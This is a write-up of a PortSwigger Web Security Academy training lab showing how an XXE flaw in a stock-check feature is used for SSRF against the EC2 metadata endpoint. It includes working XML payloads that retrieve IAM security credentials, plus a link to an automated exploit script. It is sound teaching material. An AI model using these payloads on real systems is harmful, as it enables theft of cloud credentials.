\+ Lab #2    : Exploiting XXE to perform SSRF attacks\
\+ Lab Level : Apprentice\
\+ Link      : https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

## About:
This lab has a ```Check stock``` feature that parses XML input and returns any unexpected values in the response.<br/>
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.<br/>
To solve the lab, exploit the [XXE vulnerability](https://portswigger.net/web-security/xxe) to perform an [SSRF attack](https://portswigger.net/web-security/ssrf) that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

## End Goal:
Retrieve the server's IAM secret access key from the EC2 metadata endpoint. 

## Detection:
* First of all, we need to find an XML data entry point where we can test for XXE vulnerability.
* According to the lab description, the target Web Application has a check stock feature that parses XML input.
  ![XXE](https://user-images.githubusercontent.com/101610095/221443861-16357268-24f6-40be-9eba-cf94b6c412a8.png)
* Let's visit the ```/product``` page and intercept the POST request after clicking on the ```check stock``` button:
  ![XXE2](https://user-images.githubusercontent.com/101610095/221443309-560773a8-e280-438b-b7e9-162d23f0d046.png)
* As you can see here, after clicking on the check stock button, a client-side script issues a POST request to the server, and then the server respond with the following response:<br/> 
  ![XXE3](https://user-images.githubusercontent.com/101610095/221443796-aa626e12-d1df-4bc4-80a2-b2d2d82e0e89.png)
* The client-side script will then process the server's response and update part of the user interface by displaying the number of products left.<br/>
  ![XXE1](https://user-images.githubusercontent.com/101610095/221443008-d18e6537-9e12-4868-9742-a4f126fd598b.png)

## Exploitation:
### Manual:
#### Crafting the payload:
* In order to solve the lab, we need to perform a ```Server-Side Request Forgery (SSRF)``` to query and get EC2 instance metadata, which are located by default at ```/latest/meta-data/<metadata-path>```
> 📝: **NOTE:** <br/>
> For more information about EC2 metadata, refer to: https://towardsthecloud.com/amazon-ec2-instance-metadata
* In this lab, we need to extract the server's IAM secret access key, which means, we will replace ```<metadata-path>``` with ```iam```
* The malicious external entity should look to something like this:
```XML
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
```
* Now, all we need to do is to inject this external entity in between the ```XML Prolog``` and the root element ```<stockCheck>``` and replace the *productId* number with a reference to our malicious external entity ```&xxe;``` just like we did in the previous lab :
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```
* Let's send the request:<br/>
  ![request3](https://user-images.githubusercontent.com/101610095/221720253-076cb0dc-091c-4f00-bfce-27f1c22ee7f4.png)
* Server's Response:<br/>
  ![response3](https://user-images.githubusercontent.com/101610095/221720300-fd110559-5019-451d-b854-58d2b7efebb7.png)
* As you can see, we got in the response a folder called ```security-credentials``` which will most likely contain the server's IAM secret access key.
* Let's update our payload and send the request: 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```
* Server's response: <br/>
  ![2023-02-28 01_30_27-Burp Suite Community Edition v2023 1 2 - Temporary Project](https://user-images.githubusercontent.com/101610095/221721050-5998738a-b6b8-46fd-9c88-cf30a3a76cba.png)

* The ```security-credentials``` folder contains another folder called ```admin```, which contains the server's IAM secret access key.
* Final Payload: 
```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
    1
  </storeId>
</stockCheck>
```
* Request:<br/>
  ![request4](https://user-images.githubusercontent.com/101610095/221721580-3f9a9d9b-4dd1-433e-817f-2fe32aa7761d.png)
* Response: <br/>
  ![response4](https://user-images.githubusercontent.com/101610095/221721615-074b59a8-dd06-4e05-b2b3-129b7fde724c.png)

### Automated:
* Refer to https://github.com/YounesTasra-R4z3rSw0rd/Web-Security-Academy/blob/main/XXE%20Injection/Lab%232/Lab-2.py
* Requirements:
```bash
pip3 install -m requirements.txt
```
* Help Menu: 
```bash
usage: Lab-2.py [-h] -u URL [-n]

Usage Example: python3 Lab-2.py --url https://0a2100.web-security-academy.net/ --no-proxy

options:
  -h, --help         show this help message and exit
  -u URL, --url URL  Enter the Lab URL
  -n, --no-proxy     Do not use proxy                          
```
![Lab2](https://user-images.githubusercontent.com/101610095/221735620-baed7f5a-caa2-4573-ad59-553c6f87c503.gif)
